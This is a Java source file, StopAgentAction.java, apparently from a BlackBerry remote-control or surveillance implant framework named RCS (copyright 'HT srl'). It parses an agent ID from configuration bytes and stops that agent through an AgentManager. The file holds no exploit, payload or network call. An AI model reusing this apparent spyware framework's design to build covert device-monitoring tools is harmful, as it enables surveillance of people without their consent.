/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : StopAgentAction.java 
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import java.io.EOFException;

import net.rim.device.api.util.DataBuffer;
import blackberry.AgentManager;
import blackberry.event.Event;

public class StopAgentAction extends SubAction {

    int agentId;

    public StopAgentAction(final int actionId_, final byte[] confParams) {
        super(actionId_);
        parse(confParams);
    }

    public boolean execute(final Event triggeringEvent) {
        // #debug info
	debug.info("Stopping " + agentId);
        final AgentManager agentManager = AgentManager.getInstance();

        final boolean ret = agentManager.stop(agentId);
        // disable?
        return ret;
    }

    protected boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);

        try {
            agentId = databuffer.readInt();
            // #debug debug
	debug.trace("agentId: " + agentId);

        } catch (final EOFException e) {
            // #debug
            debug.error("params FAILED");
            return false;
        }

        return true;
    }

}
